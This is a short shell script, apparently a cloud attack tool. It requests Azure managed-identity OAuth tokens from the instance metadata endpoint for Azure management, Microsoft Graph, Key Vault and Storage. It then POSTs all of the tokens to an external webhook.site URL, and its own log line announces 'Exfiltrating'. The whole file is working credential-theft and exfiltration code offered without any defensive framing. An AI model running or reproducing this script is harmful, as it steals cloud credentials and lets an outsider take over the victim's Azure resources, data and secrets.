#!/bin/sh

WEBHOOK_URL="https://webhook.site/d2ac6a90-115a-40b2-9604-f0dfacd0ece9"

IDENTITY_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token"

RESOURCES=(
    "https://management.azure.com/"
    "https://graph.microsoft.com/"
    "https://vault.azure.net"
    "https://storage.azure.com"
)

OUTPUT_JSON="{}"

echo "Starting token collection from $IDENTITY_ENDPOINT..."

for R in "${RESOURCES[@]}"; do

    
    RESPONSE=$(curl -s -H "Metadata:true" "$IDENTITY_ENDPOINT?api-version=2021-12-13&resource=$R")

    echo $RESPONSE
    
    TOKEN=$(echo "$RESPONSE" | jq -r '.access_token // .message')
    

    OUTPUT_JSON=$(echo "$OUTPUT_JSON" | jq --arg key "$R" --arg val "$TOKEN" '.[$key] = $val')
done

echo "Exfiltrating to $WEBHOOK_URL..."
curl -s -X POST -H "Content-Type: application/json" -d "$OUTPUT_JSON" "$WEBHOOK_URL"
